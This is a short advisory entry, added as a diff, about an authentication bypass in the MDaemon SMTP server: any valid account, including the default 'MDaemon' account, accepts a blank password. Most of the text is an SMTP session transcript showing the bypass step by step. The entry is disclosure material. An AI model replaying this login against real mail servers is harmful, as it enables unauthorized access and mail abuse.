@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/8382/info
+
+A vulnerability has been reported to affect the MDaemon SMTP authentication handler.
+
+It has been reported that any valid username or account can be used in conjunction with a null password, to access the MDaemon SMTP server. This issue may be exaggerated, because a default MDaemon account 'MDaemon' is well known.
+
+220 xxx.com ESMTP MDaemon 5.0.5; Sat, 02 Aug 2003 00:51:06 +0200
+EHLO localhost
+250-xxx.com Hello localhost, pleased to meet you
+250-ETRN
+250-AUTH LOGIN CRAM-MD5
+250-8BITMIME
+250 SIZE 0
+AUTH LOGIN
+334 VXNlcm5hbWU6 (334 Username:)
+TURhZW1vbg== (MDaemon)
+334 UGFzc3dvcmQ6 (334 Password:)
+(blank password)
+235 Authentication successful
